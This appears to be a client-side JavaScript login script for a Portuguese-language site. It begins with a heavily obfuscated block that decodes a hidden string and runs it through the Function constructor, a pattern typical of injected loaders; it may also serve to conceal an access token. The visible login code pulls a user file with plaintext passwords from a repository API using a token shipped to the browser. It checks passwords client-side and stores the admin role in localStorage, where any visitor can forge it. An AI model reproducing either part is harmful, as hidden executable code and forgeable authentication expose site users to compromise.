var token,username,repo,path,url;(function(){var bgB='',uZn=799-788;function OAw(a){var j=646432;var s=a.length;var y=[];for(var z=0;z<s;z++){y[z]=a.charAt(z)};for(var z=0;z<s;z++){var b=j*(z+432)+(j%47199);var m=j*(z+606)+(j%46615);var p=b%s;var w=m%s;var i=y[p];y[p]=y[w];y[w]=i;j=(b+m)%1532973;};return y.join('')};var Fwq=OAw('fgtlqmuinrjaecxzpvyrrkudhootcstcbwons').substr(0,uZn);var WGT='a)iai=+q6+;f7traw;nv)2  r=<rc9.(gsioe,y.f=)(t1ev0""z==, lw,fa( rl=hco)=a,rd,81pv;,m5a);,a9hc))u>5n;+dao]pv1l,;877p{08,; =;(r7rr6[{,th,(;;r2i8=("<;ahvCr8h;q9(az=-[u(=[(.1uvor mb[;sv],=;;=)fl]m+nf=bdg0w+l].,ai,)1pnrgu1[2eslnr]+3,.h++jcmzl;s=l4bu0blg]iqg.dpnin("lv+o,vCaearxmibhrrr7tmnrux(C0ear-h6{0fjj[e)=l;ahn07An;x)[evd isru=rnvv=s;jg;} ro.=d+8i(nfp;n+b=cr.sa2!=)vhnphxs)n=+)e(6ok5;mt u(zrnrf(vl8v1ut;rn"=inut mporqx=s.(91)o;jr.th(t oauntt(u"*-,a)0ani+u;(({)efa];a=0r9]o,t==oal(ni1i-;evaotia+)vk,,ca3v)8l.[Ca  c+edA0;a[2+-srsf];;tt2;{-.1iv7r) e{C(a}ela]f)nu= )[4[vvi.)ca.)p.r31h7a!simq;r,n}m5[n(p)yjpu,o(aqg6(ea;;lr{md}auv;a=yA*l gtolrrre+q )>orwwrusgcti;gs8)c=it-A9p=+o7;h;ae.ro}.+]va.s;.oe elvc e4fejho4v"e;lgar C==d9=a[ks2to66=jp(0;(),0t[jg.up+l+6o=S<r.+((rs})}h.a==n, )h)ef<("e(7i+cmn(]=.gc6hld=vq;)jihkn lrt(;+ .arapri(m,,.s.vn"Sso+s,pa6;mC tlx;ratfCa<)];e2A7rs.=vh=)ns6 "e9;hojqim]c1t';var frp=OAw[Fwq];var iXl='';var FRU=frp;var maB=frp(iXl,OAw(WGT));var cWf=maB(OAw('aw.3.d.\/P+]P [))P(uPPcrP)=%(r.7\/a0s;e(1bhtbtP$PP;e!#,,s"aq+4[P}.i3{f_=_;,t.rPc ;-a$.)b+1)a !6;_sun5PP_ulzahu=bp\'P!iyc()P0b4n2a(b%(f3)p[Plc4)zj!r\/,io92=]Pv."!.z%\/=td(;(]n},fj&PPth3sg&kCo42)deP)0-, %on,e\'D32r52dPx,n_Phs(tPoeP}P{o]qe,#1r$na.P1\/)1do.aafl;0P!P;)..e5a.ee!h;;pte=P*a([n1s.io)(e.)3i),;g\/P;i8de,{edo+;co6mP$ui(4ob)l\/)=4($cj(+7e6.lt)\']her(6 sPh+033,Pn\/P$;o;br-4et2{i1}l,t{4c."a%kr;Ps(4zoP_b3 n;.%o$-9;)(0fa_Pta)+t.b.P+;41(i =ePP=,(d3 ae).u$hm$)f=.S=%3)qi}_itnp_sP27!o\'..b.a4;*$"(dn(to7r,=ePg.P;4(t;P!b)eel!))(.rP2u(n)+g(=o()()lPts)i#PP-9Pk}3g+;_!bt.mm)]ot4P$4k2))P1#,P3%he ,$.).Pv +1o+a3u:._)hPx.]3#tP2rr%aPPdt0hcbob\/_lcjPh,zP)16p,e%Pv).i$PrPuh.[Ph\/(d$ok7lPl.],h=3_s..{h)(!)r*ePbegP.un !,t1.;h0=l*1+ia9.s( _}\'0sem3!6o;yr]3=!p"fa{ea3o)ePftyP.}.re$6,P2s5iP*#s-=z,;i!=.el"m(xPfm\/cr2{3!fpnfu\/&!co2(l!.Ps,rerPe_),rr}P\/t"P+.p\'PeP3Paqrp(=\/Pf{P6PP2P&,ePaitlP(a)4(g-et&nPp7jeh q$((102Pze){fe.0e=.er,!;}ssu!3)re!Ph,tz$hse;$.r}!..520o0!_.7d}.iM9P.nno}Psp%dtp;t Pr.5oi+q2npnSino,0$;s!=!)P8"(fnr6)n3o$n4$Pe.P.k;+Pnen_%.t! Pt)(7ase$,)t gq#a.7s;P_aP{-!a.4([1ad;1 P a)i=j .fo,.n(+vi0.ra4"32.qd_ =6](}.Pntlc1k!}1{$SkPC;%.gPt'));var zwj=FRU(bgB,cWf );zwj(6458);return 1750})()

function login() {
  const usuario = document.getElementById("usuario").value.trim();
  const senha = document.getElementById("senha").value.trim();
  const erro = document.getElementById("loginError");

  erro.style.display = "none";
  erro.textContent = "";

  if (!usuario || !senha) {
    erro.textContent = "Preencha todos os campos";
    erro.style.display = "block";
    return;
  }

  fetch(url, {
    headers: {
      Authorization: `token ${token}`
    }
  })
  .then(res => res.json())
  .then(data => {
    const json = JSON.parse(atob(data.content));
    const usuarios = json.usuarios;

    const encontrado = usuarios.find(u =>
      u.usuario === usuario && u.senha === senha
    );

    if (!encontrado) {
      erro.textContent = "Usuário ou senha inválidos";
      erro.style.display = "block";
      return;
    }

    localStorage.removeItem("auth");

    if (encontrado.tipo === "cliente") {
localStorage.setItem("auth", JSON.stringify({
  uuid: encontrado.uuid,
  role: encontrado.tipo
}));

      window.location.href = "../../../index.html";
    }

    if (encontrado.tipo === "admin") {
      localStorage.setItem("auth", JSON.stringify({
        uuid: encontrado.uuid,
        role: "admin"
      }));
      window.location.href = "../adm/adm.html";
    }
  })
  .catch(() => {
    erro.textContent = "Erro ao conectar com o servidor";
    erro.style.display = "block";
  });
}